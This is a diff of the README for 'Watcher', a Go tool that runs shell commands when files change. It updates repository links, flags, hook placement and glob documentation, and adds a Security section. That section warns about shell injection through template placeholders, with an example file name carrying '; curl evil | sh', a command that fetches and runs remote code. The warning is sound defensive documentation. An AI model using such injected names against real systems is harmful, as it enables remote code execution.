@@ -1,6 +1,7 @@
 # Watcher 👁️
 
-[![Go Version](https://img.shields.io/badge/go-1.24+-blue.svg)](https://golang.org/)
+[![CI](https://github.com/hrtsegv/watcher/actions/workflows/ci.yml/badge.svg)](https://github.com/hrtsegv/watcher/actions/workflows/ci.yml)
+[![Go Version](https://img.shields.io/badge/go-1.25+-blue.svg)](https://golang.org/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
 A next-generation file system watcher that **automates your workflow** with surgical precision. 
@@ -37,11 +38,11 @@ Perfect for: Go devs • DevOps • Content creators • Data engineers
 
 ### From Source
 ```bash
-go install github.com/knbr13/watcher@latest
+go install github.com/hrtsegv/watcher@latest
 ```
 
 ### Prebuilt Binaries
-Download from [Releases](https://github.com/knbr13/watcher/releases)
+Download from [Releases](https://github.com/hrtsegv/watcher/releases)
 
 ## Quick Start 🚀
 
@@ -69,6 +70,8 @@ watcher --file watcher.yaml --recursive
 | `--recursive` | `-r` | watch directories recursively | `false` |
 | `--debounce` | `-b` | debounce interval (e.g., `400ms`, `1s`) | `400ms` |
 | `--debug` | `-d` | enable debug logging | `false` |
+| `--version` | `-v` | print version information and exit | |
+| `--dry-run` | | log which commands would run without executing them | `false` |
 
 ## Configuration Guide 📋
 
@@ -76,23 +79,46 @@ watcher --file watcher.yaml --recursive
 ```yaml
 # Global settings
 debounce: 500ms      # Debounce interval (default: 400ms)
-
-# Global hooks
-on_success: "echo 'All systems go! 🚀'"
-on_failure: "curl -X POST https://api.status.io/down"
+exclude_dirs:         # Extra directory names to never watch/descend into
+  - "coverage"        # (merged with built-in defaults: node_modules, vendor, .git, dist, ...)
 
 write:
   - pattern: "src/**/*.js"
     commands:
       - "npm run lint"
       - "npm run build"
-    sequential: true  # Run commands in order
-    timeout: 1m       # Fail if build takes >1 minute
+    sequential: true      # Run commands in order
+    timeout: 1m            # Fail if build takes >1 minute
+    on_success: ["echo 'All systems go! 🚀'"]
+    on_failure: ["curl -X POST https://api.status.io/down"]
 
 create:
   - pattern: "*.{jpg,png}"
     commands: ["convert $FILE -resize 50% resized/$FILE_BASE"]
 ```
+`on_success`/`on_failure` are configured per-rule (there's no global/top-level hook) — every rule that runs commands can define its own.
+
+### Glob Pattern Syntax 🎯
+
+Patterns (`pattern` on a rule, and entries in `include`/`watch`/`exclude`) are matched with
+[doublestar](https://github.com/bmatcuk/doublestar), which extends standard shell globs with:
+
+| Syntax | Meaning |
+|--------|---------|
+| `*` | any sequence of non-separator characters |
+| `**` | zero or more directories, e.g. `**/*.go` matches `main.go` and `a/b/c/main.go` |
+| `{a,b,c}` | alternatives, e.g. `*.{jpg,png}` |
+| `!pattern` | negates the match as an *exception* within the same list |
+
+A leading `!` carves an exception out of the rest of the list it appears in — it does not
+follow `.gitignore`-style ordering. For example:
+```yaml
+include:
+  - "**/*.go"
+  - "!**/testdata/**"   # every .go file except under testdata/
+```
+A single rule's `pattern` can also be negated on its own, e.g. `pattern: "!**/*_test.go"`
+matches any file that is *not* a `_test.go` file.
 
 ### Command Placeholders 🧩
 
@@ -117,6 +143,15 @@ write:
       - echo "File {{.Base}} was modified in {{.Dir}} at {{.Time}}"
 ```
 
+A `quote` function is also available for safely embedding a placeholder that might
+contain shell metacharacters (see [Security](#security-)):
+```yaml
+create:
+  - pattern: "uploads/**"
+    commands:
+      - clamscan {{.Path | quote}} --move=/quarantine
+```
+
 ### Environment Variables 🌍
 
 | Variable       | Description                      |
@@ -130,6 +165,26 @@ write:
 | `$TIMESTAMP`   | Unix timestamp of event          |
 | `$PWD`         | Current working directory        |
 
+
+## Security 🔒
+
+Commands run through a real shell (`sh -c` on Linux/macOS, `cmd /C` on Windows), and
+`{{...}}` template placeholders are substituted directly into the command *text* before
+that shell parses it. If you watch a directory where file names aren't trusted (uploads,
+scans, anything a third party can write to) and use a placeholder like `{{.Base}}` in a
+command, a file crafted with shell metacharacters in its name (e.g. `` `; curl evil | sh` ``)
+can inject arbitrary commands.
+
+- Prefer the `$FILE`/`$FILE_BASE`/... environment variables over `{{...}}` placeholders
+  for untrusted names — they're passed to the child process as real argv/env values, not
+  spliced into the command text, so they can't inject a new command (still quote them,
+  e.g. `"$FILE"`, so a name containing spaces is treated as one argument).
+- If you do need a placeholder (e.g. to build a path), wrap it with the `quote` template
+  function: `{{.Base | quote}}` shell-escapes the value for whichever shell `watcher` will
+  invoke on the current OS.
+- On Windows, be aware `cmd.exe` has no fully safe quoting story (`%VAR%` is still expanded
+  inside double quotes) — `quote` neutralizes the common cases but isn't a hard guarantee
+  the way POSIX single-quoting is.
 
 ## Real-World Examples 🛠️
 
@@ -156,9 +211,9 @@ write:
 # Scan new uploads with ClamAV → quarantine if infected
 create:
   - pattern: "/var/www/uploads/**/*.{exe,zip}"
-    commands: 
-      - "clamscan $FILE --move=/quarantine"
-      - "curl -X POST http://localhost:8080/alert -d 'Infected: $FILE'"
+    commands:
+      - 'clamscan "$FILE" --move=/quarantine'
+      - 'curl -X POST http://localhost:8080/alert -d "Infected: {{.Base | quote}}"'
     timeout: 2m
 ```
 
@@ -234,6 +289,8 @@ write:
 -p, --path        Directory to watch (default: current)
 -d, --debug       Enable debug-level logs
 -r, --recursive   Watch directories recursively
+-v, --version     Print version information and exit
+    --dry-run     Log which commands would run without executing them
 ```
 
 ## Acknowledgements 💛
@@ -245,4 +302,4 @@ Built with these awesome libraries:
 
 ---
 
-**Watcher** © 2025 - MIT License | Crafted with ❤️ by [knbr13](https://github.com/knbr13)
+**Watcher** © 2025 - MIT License | Crafted with ❤️ by [hrtsegv](https://github.com/hrtsegv)
